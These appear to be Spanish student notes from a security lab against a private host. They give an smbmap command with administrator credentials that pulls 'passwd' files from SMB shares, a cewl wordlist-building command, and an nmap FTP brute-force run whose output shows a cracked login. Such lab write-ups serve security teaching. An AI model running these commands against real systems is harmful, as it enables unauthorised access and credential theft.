Estructura del lab:
![[lab11.png]]


## Exfiltracion a traves de directorios compartidos por SMB
Usar el siguiente comando para descargar archivos disponibles:
`smbmap -H 192.168.11.3 -u administrator -p asdf1234 -q -R --depth 2 --exclude print$ IPC$ -A 'passwd'`

## Diccionarios de contraseñas de palabras comunes contra objetivos concretos
Usar siguiente comando: `cewl -m 5 http://192.168.11.3/eii/ -w passwords.txt`

## Ataque con nmap - fuerza bruta
La salida de ejecutar el siguiente comando es el siguiente: 
`nmap --script  ftp-brute -p21 --script ftp-brute --script-args="userdb=users.txt,passdb=passwords.txt" 192.168.11.3 -oN salida`

```
Nmap scan report for lab11_kali_vuln.lab11_lab11_net (192.168.11.3)
Host is up (0.00020s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-brute: 
|   Accounts: 
|     remotessiuser:ingenieriainformatica - Valid credentials
|_  Statistics: Performed 55 guesses in 14 seconds, average tps: 3.9

```


## Searchploit
Mirar en guiones del chaval.